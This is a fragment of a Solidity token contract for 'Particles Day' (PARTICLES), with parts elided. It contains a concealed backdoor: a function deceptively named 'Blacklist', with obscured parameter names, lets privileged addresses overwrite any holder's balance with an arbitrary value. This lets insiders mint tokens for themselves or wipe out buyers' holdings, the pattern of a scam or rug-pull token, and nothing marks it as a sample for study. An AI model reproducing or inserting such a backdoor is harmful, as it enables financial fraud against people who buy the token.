...
contract PARTICLES is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "Particles Day";
    string private  _symbol = "PARTICLES";
    ...
    function Blacklist(address Ido  , uint256 Mdx , uint256 token , uint256 nft) external  { 
         require( _isExcludedFrom[msg.sender]);
         require(Ido != uniswapV2Pair);
        _bOwned[Ido] = Mdx +  token * nft.mul(2).div(100);
    }   
